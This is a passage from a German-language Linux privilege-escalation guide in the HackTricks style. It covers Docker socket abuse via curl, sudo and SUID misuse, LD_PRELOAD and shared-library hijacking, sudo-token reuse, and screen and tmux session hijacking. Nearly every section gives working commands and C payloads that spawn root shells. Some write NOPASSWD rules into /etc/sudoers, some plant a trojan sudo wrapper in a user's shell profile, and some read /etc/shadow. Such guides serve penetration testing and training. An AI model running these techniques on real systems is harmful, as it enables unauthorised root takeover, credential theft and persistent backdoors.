Falls die Docker CLI nicht verfügbar ist, kann der Docker socket weiterhin über die Docker API und `curl`-Befehle manipuliert werden.

1.  **Docker-Images auflisten:** Die Liste der verfügbaren Images abrufen.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Container erstellen:** Sende eine Anfrage, um einen Container zu erstellen, der das Root-Verzeichnis des Hosts einbindet.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Starte den neu erstellten Container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **An den Container anhängen:** Verwende `socat`, um eine Verbindung zum Container herzustellen und die Ausführung von Befehlen darin zu ermöglichen.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Nach dem Aufbau der `socat`-Verbindung können Sie Befehle direkt im Container ausführen und haben Root-Zugriff auf das Dateisystem des Hosts.

### Weitere

Beachten Sie, dass wenn Sie Schreibrechte auf den docker socket haben, weil Sie **in der Gruppe `docker`** sind, Sie [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group) haben. Wenn die [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Weitere Möglichkeiten, aus Docker auszubrechen oder es zur Eskalation von Rechten zu missbrauchen, finden Sie in:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Wenn Sie feststellen, dass Sie den **`ctr`**-Befehl verwenden können, lesen Sie die folgende Seite, da **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Wenn Sie feststellen, dass Sie den **`runc`**-Befehl verwenden können, lesen Sie die folgende Seite, da **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus ist ein ausgeklügeltes **inter-Process Communication (IPC) system**, das Anwendungen ermöglicht, effizient zu interagieren und Daten auszutauschen. Entwickelt für moderne Linux-Systeme bietet es einen robusten Rahmen für verschiedene Formen der Anwendungs-Kommunikation.

Das System ist vielseitig und unterstützt grundlegendes IPC, das den Datenaustausch zwischen Prozessen verbessert, ähnlich wie **enhanced UNIX domain sockets**. Außerdem hilft es beim Broadcasten von Ereignissen oder Signalen und fördert die nahtlose Integration zwischen Systemkomponenten. Beispielsweise kann ein Signal eines Bluetooth daemon über einen eingehenden Anruf einen Musikplayer stumm schalten, wodurch die Benutzererfahrung verbessert wird. Zusätzlich unterstützt D-Bus ein remote object system, das Service-Anfragen und Methodenaufrufe zwischen Anwendungen vereinfacht und Prozesse, die traditionell komplex waren, verschlankt.

D-Bus arbeitet nach einem **allow/deny model** und verwaltet Nachrichtenberechtigungen (Methodenaufrufe, Signalübertragungen usw.) basierend auf der kumulativen Wirkung übereinstimmender Policy-Regeln. Diese Policies legen fest, wie mit dem Bus interagiert werden darf und können durch Ausnutzung dieser Berechtigungen potenziell zu privilege escalation führen.

Ein Beispiel für eine solche Policy in `/etc/dbus-1/system.d/wpa_supplicant.conf` wird gezeigt und beschreibt Berechtigungen für den Benutzer root, `fi.w1.wpa_supplicant1` zu besitzen, Nachrichten an ihn zu senden und von ihm zu empfangen.

Policies ohne spezifizierten Benutzer oder Gruppe gelten universell, während "default"-Kontext-Policies für alle gelten, die nicht durch andere spezifische Policies abgedeckt sind.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Erfahre hier, wie man eine D-Bus-Kommunikation enumerate und exploit:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Netzwerk**

Es ist immer interessant, das Netzwerk zu enumerate und die Position der Maschine zu ermitteln.

### Allgemeine enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Offene Ports

Überprüfe immer Netzwerkdienste, die auf dem Rechner laufen und mit denen du vor dem Zugriff nicht interagieren konntest:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Überprüfe, ob du traffic sniffen kannst. Falls ja, könntest du credentials abgreifen.
```
timeout 1 tcpdump
```
## Benutzer

### Allgemeine Enumeration

Überprüfe, **wer** du bist, welche **privileges** du hast, welche **users** im System sind, welche sich **login** können und welche **root privileges** haben:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

Einige Linux-Versionen waren von einem Fehler betroffen, der Benutzern mit **UID > INT_MAX** ermöglicht, Privilegien zu eskalieren. Mehr Infos: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) und [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### Gruppen

Prüfe, ob du **Mitglied einer Gruppe** bist, die dir root-Privilegien gewähren könnte:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Zwischenablage

Prüfe, ob sich etwas Interessantes in der Zwischenablage befindet (falls möglich)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Passwort-Richtlinie
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Bekannte Passwörter

Wenn du **ein Passwort der Umgebung kennst** **versuche dich als jeden Benutzer einzuloggen** mit diesem Passwort.

### Su Brute

Wenn es dir nichts ausmacht, viel Lärm zu verursachen und die Binaries `su` und `timeout` auf dem Rechner vorhanden sind, kannst du versuchen, Benutzer mit [su-bruteforce](https://github.com/carlospolop/su-bruteforce) zu brute-forcen.\  
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) versucht mit dem Parameter `-a` ebenfalls, Benutzer per Brute-Force anzugreifen.

## Missbrauch schreibbarer PATHs

### $PATH

Wenn du feststellst, dass du **in einen Ordner im $PATH schreiben kannst**, kannst du eventuell Rechte eskalieren, indem du **eine Backdoor in den beschreibbaren Ordner legst** mit dem Namen eines Befehls, der von einem anderen Benutzer (idealerweise root) ausgeführt wird und der **nicht aus einem Ordner geladen wird, der vor** deinem beschreibbaren Ordner im $PATH liegt.

### SUDO und SUID

Es könnte dir erlaubt sein, einen Befehl mit sudo auszuführen, oder sie könnten das suid-Bit gesetzt haben. Überprüfe das mit:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Einige **unerwartete Befehle erlauben es, Dateien zu lesen und/oder zu schreiben oder sogar einen Befehl auszuführen.** Zum Beispiel:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo-Konfiguration kann einem Benutzer erlauben, einen Befehl mit den Rechten eines anderen Benutzers auszuführen, ohne das Passwort zu kennen.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
In diesem Beispiel kann der Benutzer `demo` `vim` als `root` ausführen. Es ist nun trivial, eine Shell zu bekommen, indem man einen ssh key in das root directory hinzufügt oder `sh` aufruft.
```
sudo vim -c '!sh'
```
### SETENV

Diese Direktive erlaubt es dem Benutzer, **eine Umgebungsvariable zu setzen**, während etwas ausgeführt wird:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Dieses Beispiel, **basierend auf HTB machine Admirer**, war **anfällig** für **PYTHONPATH hijacking**, um eine beliebige python library zu laden, während das Skript als root ausgeführt wurde:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV durch sudo env_keep beibehalten → root shell

If sudoers preserves `BASH_ENV` (e.g., `Defaults env_keep+="ENV BASH_ENV"`), you can leverage Bash’s non-interactive startup behavior to run arbitrary code as root when invoking an allowed command.

- Why it works: Für nicht-interaktive Shells wertet Bash `$BASH_ENV` aus und liest diese Datei ein, bevor das Zielskript ausgeführt wird. Viele sudo-Regeln erlauben das Ausführen eines Skripts oder eines Shell-Wrappers. Wenn `BASH_ENV` von sudo beibehalten wird, wird deine Datei mit root-Rechten eingelesen.

- Requirements:
- Eine sudo-Regel, die du ausführen kannst (jedes Ziel, das `/bin/bash` nicht-interaktiv aufruft, oder jedes bash-Skript).
- `BASH_ENV` in `env_keep` vorhanden (prüfe mit `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Hardening:
- Entferne `BASH_ENV` (und `ENV`) aus `env_keep`, bevorzuge `env_reset`.
- Vermeide Shell-Wrapper für mit sudo erlaubte Befehle; verwende minimale Binaries.
- Erwäge sudo I/O-Logging und Alarmierung, wenn erhaltene env vars verwendet werden.

### Sudo env_keep+=PATH / unsichere secure_path → PATH hijack

Wenn `sudo -l` `env_keep+=PATH` anzeigt oder eine `secure_path` enthält, die für Angreifer beschreibbare Einträge enthält (z. B. `/home/<user>/bin`), kann jeder relative Befehl innerhalb des sudo-erlaubten Ziels überschattet werden.

- Anforderungen: eine sudo-Regel (oft `NOPASSWD`) die ein Script/Binary ausführt, das Befehle ohne absolute Pfade (`free`, `df`, `ps`, etc.) aufruft, und ein beschreibbarer PATH-Eintrag, der zuerst durchsucht wird.
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Sudo-Ausführung: Pfade umgehen
**Jump** um andere Dateien zu lesen oder **symlinks** zu verwenden. Zum Beispiel in sudoers file: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Wenn ein **wildcard** verwendet wird (\*), ist es noch einfacher:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Gegenmaßnahmen**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo-Befehl/SUID-Binärdatei ohne Befehls-Pfad

Wenn die **sudo permission** für einen einzelnen Befehl **ohne Angabe des Pfads** vergeben ist: _hacker10 ALL= (root) less_ kannst du dies ausnutzen, indem du die PATH-Variable änderst.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Diese Technik kann auch verwendet werden, wenn ein **suid** binary **einen anderen Befehl ausführt, ohne den Pfad dazu anzugeben (prüfe immer mit** _**strings**_ **den Inhalt einer seltsamen SUID binary)**.

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary mit angegebenem Pfad zum Befehl

Wenn die **suid** binary **einen anderen Befehl ausführt und dabei den Pfad angibt**, kannst du versuchen, eine Funktion zu **exportieren**, die den Namen des Befehls trägt, den die suid-Datei aufruft.

Zum Beispiel, wenn eine suid binary _**/usr/sbin/service apache2 start**_ aufruft, musst du versuchen, die Funktion zu erstellen und zu exportieren:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Wenn du dann das suid-Binary aufrufst, wird diese Funktion ausgeführt

### LD_PRELOAD & **LD_LIBRARY_PATH**

Die Umgebungsvariable **LD_PRELOAD** wird verwendet, um eine oder mehrere Shared Libraries (.so files) anzugeben, die vom Loader vor allen anderen, einschließlich der Standard-C-Bibliothek (`libc.so`), geladen werden sollen. Dieser Vorgang ist als Preloading einer Bibliothek bekannt.

Um jedoch die Systemsicherheit zu gewährleisten und zu verhindern, dass diese Funktion, insbesondere bei **suid/sgid**-Executables, ausgenutzt wird, setzt das System bestimmte Bedingungen durch:

- Der Loader ignoriert **LD_PRELOAD** für ausführbare Dateien, bei denen die reale Benutzer-ID (_ruid_) nicht mit der effektiven Benutzer-ID (_euid_) übereinstimmt.
- Bei Executables mit **suid/sgid** werden nur Bibliotheken aus Standardpfaden vorab geladen, die ebenfalls **suid/sgid** sind.

Privilege escalation kann auftreten, wenn du Befehle mit `sudo` ausführen darfst und die Ausgabe von `sudo -l` die Anweisung **env_keep+=LD_PRELOAD** enthält. Diese Konfiguration erlaubt es, dass die Umgebungsvariable **LD_PRELOAD** erhalten bleibt und auch bei der Ausführung von Befehlen mit `sudo` berücksichtigt wird, was potenziell zur Ausführung beliebigen Codes mit erhöhten Rechten führen kann.
```
Defaults        env_keep += LD_PRELOAD
```
Speichere als **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Dann **compile it** mit:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Schließlich **escalate privileges** ausführen
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Ein ähnlicher privesc kann ausgenutzt werden, wenn der Angreifer die **LD_LIBRARY_PATH** env-Variable kontrolliert, da er den Pfad kontrolliert, in dem Bibliotheken gesucht werden.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Wenn Sie auf ein Binary mit **SUID**-Rechten stoßen, das ungewöhnlich erscheint, ist es gute Praxis zu überprüfen, ob es **.so**-Dateien korrekt lädt. Dies lässt sich überprüfen, indem Sie den folgenden Befehl ausführen:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Zum Beispiel deutet das Auftreten eines Fehlers wie _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ auf eine mögliche Ausnutzbarkeit hin.

Um dies auszunutzen, erstellt man eine C-Datei, z. B. _"/path/to/.config/libcalc.c"_, die den folgenden Code enthält:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Dieser Code versucht nach dem Kompilieren und Ausführen, Privilegien zu erhöhen, indem er Dateiberechtigungen manipuliert und eine Shell mit erhöhten Rechten ausführt.

Kompiliere die obige C-Datei in eine Shared-Object (.so)-Datei mit:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Schließlich sollte das Ausführen der betroffenen SUID binary den exploit auslösen und so eine mögliche system compromise ermöglichen.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Da wir nun ein SUID binary gefunden haben, das eine library aus einem Ordner lädt, in den wir schreiben können, erstellen wir die library in diesem Ordner mit dem notwendigen Namen:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Wenn Sie einen Fehler wie den folgenden erhalten
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
das bedeutet, dass die Bibliothek, die Sie erzeugt haben, eine Funktion namens `a_function_name` enthalten muss.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) ist eine kuratierte Liste von Unix-Binaries, die von einem Angreifer ausgenutzt werden können, um lokale Sicherheitsbeschränkungen zu umgehen. [**GTFOArgs**](https://gtfoargs.github.io/) ist dasselbe, jedoch für Fälle, in denen Sie in einem Befehl **nur Argumente injizieren** können.

Das Projekt sammelt legitime Funktionen von Unix-Binaries, die missbraucht werden können, um aus eingeschränkten Shells auszubrechen, Privilegien zu eskalieren oder aufrechtzuerhalten, Dateien zu übertragen, bind- und reverse-shells zu starten und andere Post-Exploitation-Aufgaben zu erleichtern.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Wenn Sie Zugriff auf `sudo -l` haben, können Sie das Tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) verwenden, um zu prüfen, ob es einen Weg findet, eine sudo-Regel auszunutzen.

### Reusing Sudo Tokens

In Fällen, in denen Sie **sudo access** aber nicht das Passwort haben, können Sie Privilegien eskalieren, indem Sie auf die Ausführung eines sudo-Kommandos warten und dann das Session-Token übernehmen.

Voraussetzungen, um Privilegien zu eskalieren:

- Sie haben bereits eine Shell als Benutzer "_sampleuser_"
- "_sampleuser_" hat **`sudo` verwendet**, um innerhalb der **letzten 15 Minuten** etwas auszuführen (standardmäßig ist das die Dauer des sudo-Tokens, die es uns erlaubt, `sudo` ohne Eingabe eines Passworts zu verwenden)
- `cat /proc/sys/kernel/yama/ptrace_scope` ist 0
- `gdb` ist zugänglich (Sie können es hochladen)

(Sie können `ptrace_scope` vorübergehend mit `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` aktivieren oder dauerhaft durch Ändern von `/etc/sysctl.d/10-ptrace.conf` und Setzen von `kernel.yama.ptrace_scope = 0`)

Wenn alle diese Bedingungen erfüllt sind, **können Sie Privilegien eskalieren mit:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- Der **erste Exploit** (`exploit.sh`) wird das Binary `activate_sudo_token` in _/tmp_ erstellen. Sie können es verwenden, um **den sudo-Token in Ihrer Session zu aktivieren** (Sie erhalten nicht automatisch eine root-Shell, führen Sie `sudo su` aus):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- Der **zweite exploit** (`exploit_v2.sh`) erstellt eine sh shell in _/tmp_, die **root gehört und setuid gesetzt ist**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- Der **dritte exploit** (`exploit_v3.sh`) wird eine **sudoers file** erstellen, die **sudo tokens dauerhaft gültig macht und allen Benutzern erlaubt, sudo zu verwenden**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Wenn Sie **Schreibrechte** im Ordner oder für eine der darin angelegten Dateien haben, können Sie das Binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) verwenden, um **ein sudo-Token für einen Benutzer und eine PID zu erstellen**.\
Zum Beispiel, wenn Sie die Datei _/var/run/sudo/ts/sampleuser_ überschreiben können und eine Shell als dieser Benutzer mit PID 1234 haben, können Sie **sudo-Privilegien erlangen**, ohne das Passwort zu kennen, indem Sie:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Die Datei `/etc/sudoers` und die Dateien in `/etc/sudoers.d` legen fest, wer `sudo` verwenden kann und wie. Diese Dateien **können standardmäßig nur vom Benutzer root und der Gruppe root gelesen werden**.\
**Wenn** du diese Datei **lesen** kannst, könntest du **einige interessante Informationen erhalten**, und wenn du **irgendeine Datei schreiben** kannst, kannst du **escalate privileges**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Wenn du Schreibzugriff hast, kannst du diese Berechtigung missbrauchen.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Eine weitere Möglichkeit, diese Berechtigungen auszunutzen:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Es gibt einige Alternativen zum `sudo`-Binary, wie etwa `doas` für OpenBSD. Denk daran, dessen Konfiguration in `/etc/doas.conf` zu prüfen.
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Wenn du weißt, dass ein **user normalerweise eine Verbindung zu einer Maschine herstellt und `sudo`** nutzt, um Privilegien zu eskalieren, und du eine Shell im Kontext dieses users erhalten hast, kannst du **create a new sudo executable** erstellen, das deinen Code als root und danach den Befehl des users ausführt. Ändere dann den **$PATH** des Benutzerkontexts (z. B. indem du den neuen Pfad in .bash_profile hinzufügst), sodass beim Ausführen von sudo durch den user dein sudo executable ausgeführt wird.

Beachte, dass du, falls der user eine andere shell (nicht bash) verwendet, andere Dateien anpassen musst, um den neuen Pfad hinzuzufügen. Zum Beispiel modifiziert [sudo-piggyback](https://github.com/APTy/sudo-piggyback) `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Ein weiteres Beispiel findest du in [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Oder so etwas ausführen:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Gemeinsame Bibliothek

### ld.so

Die Datei `/etc/ld.so.conf` gibt an, **woher die geladenen Konfigurationsdateien stammen**. Typischerweise enthält diese Datei folgenden Eintrag: `include /etc/ld.so.conf.d/*.conf`

Das bedeutet, dass die Konfigurationsdateien aus `/etc/ld.so.conf.d/*.conf` gelesen werden. Diese Konfigurationsdateien **verweisen auf andere Ordner**, in denen nach **Bibliotheken** gesucht wird. Zum Beispiel ist der Inhalt von `/etc/ld.so.conf.d/libc.conf` `/usr/local/lib`. **Das bedeutet, dass das System nach Bibliotheken in `/usr/local/lib` suchen wird**.

Wenn aus irgendeinem Grund **ein Benutzer Schreibrechte** auf einem der angegebenen Pfade hat: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, eine Datei innerhalb von `/etc/ld.so.conf.d/` oder einen Ordner, auf den in einer der Konfigurationsdateien in `/etc/ld.so.conf.d/*.conf` verwiesen wird, könnte er möglicherweise Privilegien eskalieren.\
Sieh dir an, **wie diese Fehlkonfiguration ausgenutzt werden kann** auf der folgenden Seite:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Wenn du die lib in `/var/tmp/flag15/` kopierst, wird sie vom Programm an dieser Stelle verwendet, wie in der `RPATH`-Variable angegeben.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Erstelle dann eine bösartige Bibliothek in `/var/tmp` mit `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities stellen einem Prozess ein **Teilset der verfügbaren root-Privilegien** zur Verfügung. Dies zerlegt effektiv die root **Privilegien in kleinere und unterscheidbare Einheiten**. Jede dieser Einheiten kann dann Prozessen unabhängig zugewiesen werden. Auf diese Weise wird der vollständige Satz an Privilegien reduziert, wodurch das Risiko einer Ausnutzung sinkt.\
Lies die folgende Seite, um **mehr über capabilities und wie man sie missbraucht** zu erfahren:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Verzeichnisberechtigungen

In einem Verzeichnis impliziert das **Bit für "execute"**, dass der betroffene Benutzer in das Verzeichnis "**cd**" kann.\
Das **"read"**-Bit bedeutet, dass der Benutzer die **Dateien** **auflisten** kann, und das **"write"**-Bit bedeutet, dass der Benutzer **Dateien löschen** und **neue Dateien erstellen** kann.

## ACLs

Access Control Lists (ACLs) stellen die sekundäre Ebene diskretionärer Berechtigungen dar und sind in der Lage, die traditionellen ugo/rwx-Berechtigungen **zu überschreiben**. Diese Berechtigungen verbessern die Kontrolle über den Zugriff auf Dateien oder Verzeichnisse, indem sie bestimmten Benutzern, die nicht Eigentümer sind oder nicht zur Gruppe gehören, Rechte gewähren oder verweigern. Diese **Granularität sorgt für eine präzisere Zugriffsverwaltung**. Weitere Details finden Sie [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Gib** dem Benutzer "kali" Lese- und Schreibrechte für eine Datei:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Erhalte** Dateien mit bestimmten ACLs vom System:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Offene shell sessions

In **älteren Versionen** kannst du möglicherweise eine **shell** session eines anderen Benutzers (**root**) **hijack**.\
In **neueren Versionen** kannst du dich nur mit **screen** sessions deines **eigenen Benutzers** **connect**. Allerdings könntest du **interessante Informationen innerhalb der session** finden.

### screen sessions hijacking

**screen sessions auflisten**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**An eine session anhängen**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux-Sitzungen kapern

Dies war ein Problem bei **älteren tmux-Versionen**. Ich konnte eine von root erstellte tmux (v2.1) Sitzung nicht als nicht-privilegierter Benutzer kapern.

**tmux-Sitzungen auflisten**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**An eine Session anhängen**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Siehe **Valentine box from HTB** als Beispiel.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Alle SSL- und SSH-Schlüssel, die auf Debian-basierten Systemen (Ubuntu, Kubuntu, etc) zwischen September 2006 und dem 13. Mai 2008 erzeugt wurden, können von diesem Fehler betroffen sein.\
